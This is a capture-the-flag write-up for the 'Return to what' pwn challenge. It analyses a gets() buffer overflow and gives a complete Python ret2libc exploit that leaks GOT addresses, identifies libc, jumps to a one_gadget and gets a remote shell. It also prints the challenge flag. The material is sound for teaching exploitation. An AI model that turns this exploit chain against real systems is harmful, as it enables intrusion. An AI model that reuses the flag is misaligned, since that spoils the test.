# Return to what [medium]

**Author:** Faith

*This will show my friends!*

`nc chal.duc.tf 30003`

**Attached files:** `return-to-what` (sha256: a679b33db34f15ce27ae89f63453c332ca7d7da66b24f6ae5126066976a5170b)

#### This challenge was quickly finished with [pwnscripts](https://github.com/152334H/pwnscripts). Try it!

And I do really mean *quickly*: Third blood is not something I usually do, with how slowly I write exploits.

## Analysis
There isn't much to scope out here.
```c
void vuln() {
  char s[0x30]; // [rsp+0h] [rbp-30h]
  puts("Where would you like to return to?");
  return gets(s);
}
int main() {
	puts("Today, we'll have a lesson in returns.");
	vuln();
}
```
`gets()` provides an infinte buffer flow, and judging by the challenge title, the goal here is a [ret2libc](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2libc) attack.

We're also aided by the lack of general protections:
```python
[*] '/path/to/return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
If *all* of these protections were enabled, this challenge would actually be rather difficult.

Hypotheticals aside, there are 3 simple things we need to pwn this challenge:

0. Initialise important stuff
   ```python
   from pwnscripts import *
   context.binary = 'return-to-what'
   context.libc_database = 'libc-database'
   r = remote('chal.duc.tf', 30003)
   ```
1. use Return Oriented Programming to leak out libc addresses from the GOT table. The GOT table is easy to leak with a call to `puts()`; this is only possible because PIE is disabled.
   ```python
   rop = ROP(context.binary)
   rop.raw(b'\0'*0x38)
   rop.puts(context.binary.got['puts'])
   rop.puts(context.binary.got['gets'])
   rop.main()
   r.sendlineafter('to?\n', rop.chain())
   ```
2. using the leaked addreses, identify the remote libc version, and calculate the location of a [one-gadget](https://github.com/david942j/one_gadget). This is really easy with `pwnscripts`:
   ```python
   libc_leaks = {'puts': extract_first_bytes(r.recvline(),6),
				 'gets': extract_first_bytes(r.recvline(),6)}
   context.libc = context.libc_database.libc_find(libc_leaks)	# Will be identified as libc6_2.27-3ubuntu1_amd64
   one_gadget = context.libc.select_gadget(1)
   ```
3. return back to `main()`, and write a jump to get to the `one_gadget`.
   ```python
   rop = ROP(context.binary)
   rop.raw(b'\0'*0x38)
   rop.call(one_gadget)
   rop.raw(b'\0'*99)	# To satisfy one-gadget
   r.sendlineafter('to?\n', rop.chain())
   r.interactive()
   ```

That's it.

```bash
>>> r.interactive()
[*] Switching to interactive mode
ls
flag.txt
return-to-what
```
## Flag
`DUCTF{ret_pUts_ret_main_ret_where???}`